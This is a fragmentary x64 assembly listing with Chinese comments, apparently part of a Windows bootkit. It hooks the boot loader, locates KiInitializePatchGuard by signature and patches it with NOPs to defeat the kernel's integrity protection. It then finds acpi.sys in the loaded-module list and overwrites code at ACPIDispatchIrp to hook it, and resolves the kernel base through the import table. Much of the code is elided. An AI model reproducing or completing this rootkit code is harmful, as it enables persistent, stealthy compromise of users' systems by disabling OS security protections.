...
hook_ntldr_retf equ $-@B 
     ...
     @@:inc edi
        dec ecx
        jz @@@14
        cmp dword ptr [edi],0E08e8b48h;特征码定位osload.
        jnz @B
...
winload_code_retf:  
     ...
     @@:sub r8,1000H
        ...
        mov r9,r8
        add r9w,1f0h
        mov edx,dword ptr[r9+21*40+8+4];INIT.VOffset
        mov ecx,dword ptr[r9+21*40+8];INIT.Rsize
        add rdx,r8;内核.INIT 段尾部0区地址
        dec rdx
     @@:inc rdx
        test ecx,ecx
        jz @@@12
        cmp dword ptr [rdx],058EC8148H
        JNZ @B;特征码定位 KiInitializePatchGuar+19h  汇编代码为sub rsp,0f58h
        mov word ptr [rdx+15],9090h;阻止检测是否为安全模式，直接进入安全模式。
        ...
        .while rdx
        	mov r8,[rdx+8*12]
        	.break .if (dword ptr [r8]==00430041h &&  dword ptr [r8+4]==00490050h);ACPI  
        	mov rdx,[rdx];迭代
        .endw
        ...
        rep movsb
        mov rcx,0002b000h;acpi.sys .code段大小，防止acpi升级，特征码变化，导致异常
        add r8,1000h
        ...
        jz  @@@12
        inc r8 
        cmp dword ptr [r8],24548a41H;ACPIDispatchIrp+c3特征码搜索41 8A 54 24 01   mov     dl, [r12+1]   3C 16      cmp     al, 16h
        JNZ @B
        cmp dword ptr [r8+4],0f163c01h
        jnz @B
...
ACPIDispatchIrp@ proc stdcall   uses rax rbx rcx rdx rsi rdi r8 r9 r10 r11 r12 r13 r14 r15  pNextDirective:qword;x64 约定 rcx rdx r8 r9 寄存器为前4个参数，rbx rsi rdi rbp 函数调用不能变
        ...
        mov dword ptr [rax-5],024548a41H
        mov byte ptr  [rax-1],1
    

   
        .if word ptr [rax-19h]==015ffh;通过IAT查找内核基础地址  rax-19h指向 call  cs:__imp_IofCompleteRequest FF 15 8F 0A 02 00
                mov r12d,[rax-19h+2]
                lea r12,[r12+rax-19h+6]   ;目标地址=下一条指令地址+操作数值
                mov r12,[r12]
